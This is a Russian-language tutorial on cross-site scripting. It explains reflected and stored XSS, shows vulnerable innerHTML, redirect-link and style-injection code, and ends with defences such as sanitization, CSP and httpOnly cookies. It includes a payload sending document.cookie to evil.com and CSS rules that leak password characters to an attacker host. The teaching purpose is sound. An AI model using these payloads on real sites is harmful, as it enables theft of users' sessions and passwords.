XSS

Cross-Site Scripting — тип атаки, заключающийся во внедрении на страницу вредоносного кода, который будет выполнен в контексте источника конкретного сайта с целью обхода политик единого источника, и взаимодействии этого кода с веб-сервером злоумышленника.

Используя XSS, злоумышленник может украсть из браузера пользователя так называемые sensitive данные, выполнить от имени пользователя различные действия или, например, провести DOS-атаку.

Различают два вида XSS:

  • Reflected: http://example.com/search.php?q=<script>DoSomething();</script>
  • Stored: <script>document.location="http://evil.com/?"+document.cookie</script>

Рассмотрим пример с шаблонизатором:

const templator = text => `<h1>${text}</h1>`;

div.innerHTML = templator('<script>alert("XSS")</script>');

В функцию templator могут попадать любые пользовательские данные, данные с сервера или данные из API третьих лиц. В данном случае реализовали stored XSS уязвимость. Код alert("XSS") будет выполнен у пользователя. Вместо alert может быть любой вредоносный код: например, отправить данные на сайт злоумышленника или сделать DOS.

Через работу с API можно также воспроизвести уязвимость:

const response = http.get('/message');
const messageText = response.content;
 
const chat = document.getElementById('chat');
chat.innerHTML += messageText;

К сожалению счастью, не всякий код может сработать. Например, вот так уязвимость не сработает:

chat.innerHTML += `
  </div><script>alert("XSS")</script>
`;

Однако обходной путь — использовать любой инструмент великого и могучего JavaScript, чтобы вызвать код:

chat.innerHTML += `
  </div><img src="/404-or-trash-url.png" onerror="alert('XSS')">
`;

Рассмотрим ещё один пример:

// Необходимо сделать редирект
// Например, OAuth авторизация, о которой подробно поговорим во втором модуле
// и даже будем использовать в проекте
const backRedirectUrl = new URLSearchParams(window.location.search).get('back');
 
const link = document.createElement('a');
link.textContent = 'Click Me!';
link.href = backRedirectUrl;
document.appendChild(link);

Использовать уязвимость в примере выше можно следующим образом:

// Находимся на
// https://my.service.io/?back=javascript%3Aalert%28%27XSS%27%29%3B
const backRedirectUrl = // "javascript:alert('XSS');"
new URLSearchParams(window.location.search).get('back');
 
const link = document.createElement('a');
link.href = backRedirectUrl;
 
// <a href="javascript:alert('XSS');">Click Me!<a>

В результате при нажатии на ссылку — выполним JavaScript код.

Рассмотрим ещё один интересный пример, где эксплуатировать уязвимость можно даже через стили:

const {avatarUrl} = http.get('/me');
 
const styleContent = `
  #avatar {
    background: url(${avatarUrl}); // Подставляем ссылку на аватар пользователя
  }
`;
 
const style = document.createElement('style');
style.textContent = styleContent;
document.appendChild(style);

/** В avatarUrl содержится следующее:

В результате в переменной styleContent будет подобное описание стилей:

#avatar {
  background: url();}
	[type=password][value^='a'] { background-image: url(https://hack.er/a); }
	[type=password][value^='b'] { background-image: url(https://hack.er/b); }
	[type=password][value^='c'] { background-image: url(https://hack.er/c); }
	[type=password][value^='d'] { background-image: url(https://hack.er/d); }
	[type=password][value^='e'] { background-image: url(https://hack.er/e); }
	div { background: url();
}

Теперь при вводе пользователем букв “a”, “b”, “c”, “d” или “e” — будет выполняться запрос за background-image, поскольку в стилях прописаны такие правила. Но запрос будет отправлен на сайт злоумышленника с определённым значением. Так можно сделать для всех значений клавиатуры и мыши.

Вот так, не слишком затейливо, злоумышленник умеет «прослушивать», о чём пишет пользователь на сайте.

Написать код, уязвимый к XSS, очень просто. Вы можете легко воспроизвести уязвимость у себя, вставив несложные строчки к себе в *.html файл и открыв его:

<textarea id="textarea" type="text"></textarea>
<button id="button">Сохранить</button>
<div id="result"></div>
<script>
  button.addEventListener('click', function () {
    result.innerHTML = textarea.value;
  });
</script>

Способы защиты от XSS

Рекомендации:

  • Используйте санитайзинг или экранирование данных:
import sanitizeHtml from 'sanitize-html';

const evilHtml = `
  <p style="background-image: url('attacker.com')">
    Hello, world!
  </p>
  <script>alert(document.cookie);</script>
`;

const kindHtml = sanitizeHtml(evilHtml, {
  allowedTags: ['a', 'p', 'div'],
  allowedAttributes: { a: ['href'] }
});
// <p>Hello, world!</p>
  • Используйте Content Security Policy (CSP). Описать их несложно, но они добавят «большой слой» защиты от вредоносного кода:
Content-Security-Policy:
  default-src 'self';
  img-src *;
  script-src trusted.com;

Content-Security-Policy:
  media-src https://yandex.ru
  • Скрупулёзный санитайзинг или эскейпинг пользовательского контента. OWASP отлично расписывает, как фильтровать контент;
  • Используйте белые списки при фильтрации HTML;
  • Правильная работа с куками, например, используйте httpOnly;
  • Используйте заголовки X-XSS-Protection;
  • Используйте фреймворки или библиотеки, в которых работа с XSS уже есть. Например, React или Vue;
  • Используйте Content Security Policy (CSP). Хорошо об этом написано на xaker.ru и Medium. Список директив описан на MDN.

Про XSS можно отдельно почитать на Хабре.
